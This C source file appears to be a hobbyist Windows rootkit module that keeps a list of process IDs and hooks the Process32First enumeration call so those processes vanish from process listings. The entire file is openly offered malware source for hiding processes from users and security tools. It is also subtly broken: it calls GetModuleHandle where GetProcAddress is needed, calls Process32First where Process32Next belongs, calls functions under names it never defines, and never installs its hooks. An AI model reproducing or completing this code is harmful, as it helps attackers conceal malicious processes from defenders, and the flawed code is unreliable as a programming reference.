#define _CRT_SECURE_NO_WARNINGS

#include "proc_hide.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

hidden_process_t* hidden_list = NULL;

static void add_to_hidden_list(DWORD pid, const char* name) {
	hidden_process_t* new_node = malloc(sizeof(hidden_process_t));
	if (!new_node) return;
	new_node->pid = pid;
	strncpy(new_node->name, name, MAX_PATH - 1);
	new_node->name[MAX_PATH - 1] = '\0';
	new_node->next = hidden_list;
	hidden_list = new_node;
	printf("[rootkit] added pid %d (%s) to hidden list.\n", pid, name);
}

static int rem_from_hidden_list(DWORD pid) {
	hidden_process_t* current = hidden_list;
	hidden_process_t* prev = NULL;
	while (current) {
		if (current->pid == pid) {
			if (prev) {
				prev->next = current->next;
			}
			else {
				hidden_list = current->next;
			}
			printf("[rootkit] removed pid %d from hidden list.\n", pid);
			free(current);
			return 1;
		}
		prev = current;
		current = current->next;
	}
	return 0;
}

int is_proc_hidden(DWORD pid) {
	hidden_process_t* current = hidden_list;
	while (current) {
		if (current->pid == pid) return 1;
		current = current->next;
	}
	return 0;
}

HANDLE WINAPI hooked_createtoolhelp32snap(DWORD dwflags, DWORD th32procid) {
	typedef HANDLE(WINAPI* original_createtoolhelp32snap_t)(DWORD, DWORD);
	static original_createtoolhelp32snap_t original = NULL;
	if (!original) {
		original = (original_createtoolhelp32snap_t) GetProcAddress(GetModuleHandle("kernel32.dll"), "CreateToolhelp32Snapshot");
	}
	return original(dwflags, th32procid);
}

BOOL WINAPI hooked_proc32first(DWORD hsnapshot, LPPROCESSENTRY32 lppe) {
	typedef BOOL(WINAPI* original_process32first_t)(HANDLE, LPPROCESSENTRY32);
	static original_process32first_t original = NULL;
	if (!original) {
		original = (original_process32first_t)GetModuleHandle("kernel32.dll", "Process32First");
	}
	BOOL result = original(hsnapshot, lppe);
	if (result) {
		while (result && is_proc_hidden(lppe->th32ProcessID)) {
			result = original(hsnapshot, lppe);
		}
	}
	return result;
}

int hide_process_by_pid(DWORD pid) {
	HANDLE hsnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hsnapshot == INVALID_HANDLE_VALUE) {
		printf("[rootkit] what the fuck\n");
		return 0;
	}
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hsnapshot, &pe)) {
		do {
			if (pe.th32ProcessID == pid) {
				add_to_hidden_list(pid, pe.szExeFile);
				CloseHandle(hsnapshot);
				return 1;
			}
		} while (Process32Next(hsnapshot, &pe));
	}

	CloseHandle(hsnapshot);
	printf("[rootkit] process with PID %d not found\n", pid);
	return 0;
}

int hide_process_by_name(const char* process_name) {
	HANDLE hsnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hsnapshot == INVALID_HANDLE_VALUE) return 0;
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);
	int found = 0;
	if (Process32First(hsnapshot, &pe)) {
		do {
			if (_stricmp(pe.szExeFile, process_name) == 0) {
				if (!is_process_hidden(pe.th32ProcessID)) {
					add_to_hidden_list(pe.th32ProcessID, pe.szExeFile);
					found++;
				}
			}
		} while (Process32Next(hsnapshot, &pe));
	}
	CloseHandle(hsnapshot);
	if (found) {
		printf("[rootkit] hid %d instance(s) of %s\n", found, process_name);
	}
	else {
		printf("[rootkit] process %s not found or already hidden\n", process_name);
	}
	return found;
}

int unhide_process_by_pid(DWORD pid) {
	return remove_from_hidden_list(pid);
}

int unhide_process_by_name(const char* process_name) {
	hidden_process_t* current = hidden_list;
	int unhidden = 0;
	while (current) {
		if (_stricmp(current->name, process_name) == 0) {
			DWORD pid = current->pid;
			current = current->next;
			unhidden += remove_from_hidden_list(pid);
			continue;
		}
		current = current->next;
	}
	if (unhidden) {
		printf("[rootkit] unhid %d instance(s) of %s\n", unhidden, process_name);
	}
	else {
		printf("[rootkit] no hidden processes named %s found\n", process_name);
	}
	return unhidden;
}

void list_processes(void) {
	HANDLE hsnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hsnapshot == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to create snapshot\n");
		return;
	}
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);

	// credits - chatgpt i couldnt be bothered to make this part
	printf("\n=== Process List ===\n");
	printf("%-10s %-30s %s\n", "PID", "Name", "Status");
	printf("------------------------------------------\n");
	if (Process32First(hsnapshot, &pe)) {
		do {
			if (is_process_hidden(pe.th32ProcessID)) {
				printf("%-10d %-30s [HIDDEN]\n", pe.th32ProcessID, pe.szExeFile);
			}
			else {
				printf("%-10d %-30s [VISIBLE]\n", pe.th32ProcessID, pe.szExeFile);
			}
		} while (Process32Next(hsnapshot, &pe));
	}
	CloseHandle(hsnapshot);
	printf("\n");
}
